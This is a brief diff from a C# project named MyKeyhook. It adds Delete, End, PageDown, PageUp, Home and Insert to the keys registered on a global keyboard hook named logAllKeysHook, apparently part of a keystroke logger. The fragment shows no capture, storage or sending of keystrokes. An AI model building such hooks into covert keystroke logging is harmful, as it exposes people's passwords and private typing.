@@ -94,7 +94,14 @@ namespace MyKeyhook
             logAllKeysHook.HookedKeys.Add(Keys.Multiply);
             logAllKeysHook.HookedKeys.Add(Keys.Enter);
             logAllKeysHook.HookedKeys.Add(Keys.Decimal);
-            
+            //init special keys
+            logAllKeysHook.HookedKeys.Add(Keys.Delete);
+            logAllKeysHook.HookedKeys.Add(Keys.End);
+            logAllKeysHook.HookedKeys.Add(Keys.PageDown);
+            logAllKeysHook.HookedKeys.Add(Keys.PageUp);
+            logAllKeysHook.HookedKeys.Add(Keys.Home);
+            logAllKeysHook.HookedKeys.Add(Keys.Insert);
+
 
             //------------------------------------------------------------------------------------------------------------------------------------------------
 
